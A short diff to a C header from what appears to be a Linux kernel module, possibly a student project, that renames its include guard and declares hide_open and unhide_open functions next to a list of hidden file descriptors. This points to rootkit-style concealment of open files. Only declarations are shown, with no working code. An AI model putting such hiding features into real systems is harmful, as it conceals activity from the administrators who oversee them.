@@ -1,5 +1,5 @@
-#ifndef _GROUP7_HIDEOPEN_H
-#define _GROUP7_HIDEOPEN_H
+#ifndef _GROUP7_OPENHIDE_H
+#define _GROUP7_OPENHIDE_H
 
 #include <linux/types.h>
 
@@ -18,6 +18,9 @@ typedef struct fd_list {
 
 extern fd_list_t hidden_fds;
 
+void hide_open(void);
+void unhide_open(void);
+
 pid_t may_fd(struct file *);
 void fill_fds(pid_t);
 
@@ -28,4 +31,4 @@ fd_list_t_ptr find_fd_in_list(fd_list_t_ptr, int);
 fd_list_t_ptr add_fd_to_list(fd_list_t_ptr, int);
 fd_list_t_ptr remove_fd_from_list(fd_list_t_ptr list, int fd);
 
-#endif//_GROUP7_HIDEOPEN_H
+#endif//_GROUP7_OPENHIDE_H
